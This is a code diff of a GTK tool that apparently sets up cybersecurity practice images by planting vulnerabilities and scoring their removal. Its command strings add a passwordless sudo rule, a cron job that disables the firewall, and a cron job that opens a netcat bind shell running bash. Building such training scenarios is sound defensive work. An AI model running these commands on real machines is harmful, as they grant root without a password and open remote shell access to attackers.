@@ -121,7 +121,7 @@ class MiscBox(Gtk.ScrolledWindow):
         note_label_2.set_line_wrap(True)
         master_box.pack_end(note_label_2, False, False, 0)
 
-        self.add(master_box)
+        self.add_with_viewport(master_box)
 
     def check_button_clicked(self, button):
         i = button.type
@@ -153,6 +153,7 @@ class MiscBox(Gtk.ScrolledWindow):
             add(w.elements, "Insecure sudo configuration fixed,V,12,FileContents,/etc/sudoers,FALSE," + user + "  ALL=(ALL:ALL) ALL")
         elif i == 1:
             add(w.commands, "sudo echo \"" + os.environ['SUDO_USER'] + "  ALL=(ALL) NOPASSWD:ALL\" > /etc/sudoers.d/extra")
+            add(w.commands, "sudo chmod 440 /etc/sudoers.d/extra")
             add(w.elements, "Insecure sudo configuration file removed,V,12,FileExistance,/etc/sudoers.d/extra,FALSE")
         elif i == 2:
             add(w.commands, "sudo crontab -l > mycron; echo \"*/5 * * * * sudo ufw disable\" >> mycron; sudo crontab mycron; rm mycron")
@@ -161,7 +162,7 @@ class MiscBox(Gtk.ScrolledWindow):
             add(w.commands, "sudo crontab -l > mycron; echo \"*/2 * * * * nc -l -p 4837 -e /bin/bash\" >> mycron; sudo crontab mycron; rm mycron")
             add(w.elements, "Scheduled task that launches netcat backdoor removed,V,8,Command,sudo crontab -l,FALSE,nc -l")
         elif i == 4:
-            add(w.commands, "sudo crontab -l > mycron; echo \'*/3 * * * * notify-send -u critical \"Taunt\" \"" + text + "\"\' >> mycron; sudo crontab mycron; rm mycron")
+            add(w.commands, "sudo crontab -l > mycron; echo \'*/3 * * * * notify-send \"Taunt\" \"" + text + "\"\' >> mycron; sudo crontab mycron; rm mycron")
             add(w.elements, "Scheduled task that launches taunt removed,V,8,Command,sudo crontab -l,FALSE,notify-send")
         elif i == 5:
             text = text.replace("\"", "")
